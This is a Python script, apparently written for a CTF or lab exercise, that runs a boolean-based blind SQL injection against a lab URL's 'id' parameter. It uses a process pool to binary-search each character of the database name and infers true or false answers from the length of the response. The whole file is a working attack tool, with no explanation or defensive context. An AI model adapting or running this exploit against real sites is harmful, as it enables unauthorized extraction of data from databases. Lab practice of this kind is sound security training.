#coding:utf-8
import requests
import time
from multiprocessing import Pool

'''
通过多进程同时爆破多个字符位，提高效率
'''

url="http://rhiq8003.ia.aqlab.cn/?id=1"

payload1=" and (select case when length((database()))>1 then 1 else 0 end)"
payload2=" and (select case when ascii(substr(database(),1,1)) between 32 and 127 then 1 else 0 end)"
flag=""

def getLength():
    lastI=1
    for i in range(1,50):
        payload=" and (select case when length((database()))>=%d then 1 else 0 end)"%i
        
        r = requests.get(url=url+payload,timeout=0.5) 
        
        if (len(r.content.decode())>2000) and (len(r.content.decode())<3000):
            lastI=i
        else:
            break
            
    return lastI
    
def chkASCII(intIndex):
    minASCII=32
    maxASCII=127
    iTmp=0
    iChr=""
    
    while 1:
        iTmp +=1
        tmpASCII = round((minASCII+maxASCII)/2)


        payload=" and (select case when ascii(substr(database(),%d,1)) between %d and %d then 1 else 0 end)"%(intIndex+1,tmpASCII,maxASCII)


        r = requests.get(url=url+payload,timeout=0.5) 
        
        if (len(r.content.decode())>2000) and (len(r.content.decode())<3000):
            minASCII=tmpASCII
        else:
            maxASCII=tmpASCII
            
        if (tmpASCII==maxASCII and minASCII==tmpASCII-1):
            iChr=chr(tmpASCII-1)
            break
            
        time.sleep(1)
    return intIndex,iChr

if __name__ == '__main__':
    # 获取字符串长度
    intDBLength=getLength()
    # 定义进程池大小
    pool = Pool(10)
    # 计时开始
    pro_start_time = time.time()
    # 填充进程池
    tmpList= pool.map(chkASCII, range(intDBLength))
    # 对返回结果进行排序
    tmpList.sort()
    
    for s in tmpList:
        flag+=s[1]
    # 打印结果
    print("FLAG is :%s,Time: %ss"%(flag,str(round(time.time() - pro_start_time, 2))))